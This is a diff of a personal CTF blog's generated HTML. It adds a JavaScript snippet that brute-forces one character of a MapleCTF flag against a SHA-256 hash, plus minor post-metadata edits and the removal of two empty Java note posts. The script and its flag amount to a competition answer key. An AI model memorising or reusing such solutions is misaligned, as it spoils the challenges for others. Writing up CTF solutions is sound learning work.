+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">&quot;maple&#123;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> honk = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">hash</span>(<span class="params">string</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> utf8 = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>().<span class="title function_">encode</span>(string);</span><br><span class="line">  <span class="keyword">const</span> hashBuffer = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">digest</span>(<span class="string">&quot;SHA-256&quot;</span>, utf8);</span><br><span class="line">  <span class="keyword">const</span> hashArray = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(hashBuffer));</span><br><span class="line">  <span class="keyword">const</span> hashHex = hashArray</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">bytes</span>) =&gt;</span> bytes.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>))</span><br><span class="line">    .<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> hashHex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">constructflag</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">32</span>; i &lt;= <span class="number">126</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> fleg = <span class="string">&quot;maple&#123;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fleg += &#123;&#125;.<span class="title function_">toString</span>()[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    fleg += <span class="string">&quot;aN&quot;</span>; <span class="comment">//NaN</span></span><br><span class="line">    <span class="keyword">const</span> char = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i);</span><br><span class="line">    fleg += <span class="string">&quot;a&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fleg += char.<span class="title function_">repeat</span>(<span class="number">4</span>) + <span class="string">&quot;as&quot;</span> + <span class="string">&quot;_are_a_mId_FruiT&#125;&quot;</span>;  <span class="comment">// [null]</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (<span class="keyword">await</span> <span class="title function_">hash</span>(fleg)) ==</span><br><span class="line">      <span class="string">&quot;bfe06d1e92942a0eca51881a879a0a9aef3fe75acaece04877eb0a26ceb8710d&quot;</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(fleg);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">constructflag</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/09/18/16-34-28/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -220,9 +446,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-09-18 16:34:28 / 修改时间：18:31:07" itemprop="dateCreated datePublished" datetime="2023-09-18T16:34:28+08:00">2023-09-18</time>
+      <time title="创建时间：2023-09-18 16:34:28" itemprop="dateCreated datePublished" datetime="2023-09-18T16:34:28+08:00">2023-09-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-10-04 17:32:44" itemprop="dateModified" datetime="2023-10-04T17:32:44+08:00">2023-10-04</time>
     </span>
 
   
@@ -242,7 +474,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1>2023SECCONCTF</h1>
+          <h1 id="2023SECCONCTF"><a href="#2023SECCONCTF" class="headerlink" title="2023SECCONCTF"></a>2023SECCONCTF</h1>
           <!--noindex-->
           <!--/noindex-->
         
@@ -495,7 +727,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-07 23:21:02" itemprop="dateModified" datetime="2023-09-07T23:21:02+08:00">2023-09-07</time>
+      <time title="修改时间：2023-09-20 15:18:50" itemprop="dateModified" datetime="2023-09-20T15:18:50+08:00">2023-09-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -524,7 +756,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1>2023sekaiCTF</h1>
+          <h1 id="2023sekaiCTF"><a href="#2023sekaiCTF" class="headerlink" title="2023sekaiCTF"></a>2023sekaiCTF</h1>
           <!--noindex-->
           <!--/noindex-->
         
@@ -895,182 +1127,6 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1>Servlet</h1>
-          <!--noindex-->
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/08/16/17-53-10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="diffany">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diffany">
-      <meta itemprop="description" content="一个努力学习的菜鸟">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | diffany">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/08/16/17-53-10/" class="post-title-link" itemprop="url">spring-boot</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-08-16 17:53:10 / 修改时间：17:56:39" itemprop="dateCreated datePublished" datetime="2023-08-16T17:53:10+08:00">2023-08-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/2023/08/16/17-53-10/" class="post-meta-item leancloud_visitors" data-flag-title="spring-boot" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>spring boot learning note</h1>
-          <!--noindex-->
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/08/16/17-48-33/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="diffany">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diffany">
-      <meta itemprop="description" content="一个努力学习的菜鸟">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | diffany">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/08/16/17-48-33/" class="post-title-link" itemprop="url">java基础</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-08-16 17:48:33 / 修改时间：17:51:58" itemprop="dateCreated datePublished" datetime="2023-08-16T17:48:33+08:00">2023-08-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/2023/08/16/17-48-33/" class="post-meta-item leancloud_visitors" data-flag-title="java基础" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>java 基础</h1>
           <!--noindex-->
           <!--/noindex-->
         
